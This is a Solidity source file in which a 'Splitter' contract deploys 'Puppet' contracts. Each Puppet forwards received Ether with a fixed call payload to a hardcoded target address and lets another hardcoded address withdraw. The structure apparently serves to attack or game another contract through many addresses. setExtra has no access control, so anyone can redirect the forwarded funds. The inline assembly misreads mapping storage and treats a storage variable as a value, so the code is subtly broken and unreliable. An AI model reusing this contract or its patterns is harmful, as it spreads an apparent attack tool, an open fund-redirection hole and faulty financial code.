pragma solidity ^0.4.23;

contract Splitter {
    address public owner;
    address[] public puppets;
    mapping(uint256 => address) public extra;
    address private _addy;
    uint256 private _share;
    uint256 private _count;

    constructor() payable public {
        owner = msg.sender;
        newPuppet();
        newPuppet();
        newPuppet();
        newPuppet();
        extra[0] = puppets[0];
        extra[1] = puppets[1];
        extra[2] = puppets[2];
        extra[3] = puppets[3];
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function getPuppetCount() public constant returns (uint256 puppetCount) {
        return puppets.length;
    }

    function newPuppet() public returns (address newPuppet) {
        require(msg.sender == owner);
        Puppet p = new Puppet();
        puppets.push(p);
        return p;
    }

    function setExtra(uint256 _id, address _newExtra) public {
        require(_newExtra != address(0));
        extra[_id] = _newExtra;
    }

    function fundPuppets() public payable {
        require(msg.sender == owner);
        _share = SafeMath.div(msg.value, 4);

        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0xf2c298be)
            mstore(add(ptr, 4), caller)
            mstore(add(ptr, 36), callvalue)
            mstore(add(ptr, 68), 800000)
            for { let i := 0 } lt(i, 4) { i := add(i, 1) } {
                let addr := sload(add(extra_slot, i))
                call(gas, addr, _share, ptr, 72, 0, 0)
            }
        }
    }

    function() payable public {}
}

contract Puppet {
    mapping(uint256 => address) public target;
    mapping(uint256 => address) public master;

    constructor() payable public {
        target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
    }

    function() public payable {
        if (msg.sender != target[0]) {
            assembly {
                let ptr := mload(0x40)
                mstore(ptr, 0xf2c298be)
                mstore(add(ptr, 4), caller)
                mstore(add(ptr, 36), callvalue)
                mstore(add(ptr, 68), 600000)
                call(gas, sload(target_slot), callvalue, ptr, 72, 0, 0)
            }
        }
    }

    function withdraw() public {
        require(msg.sender == master[0]);
        master[0].transfer(address(this).balance);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}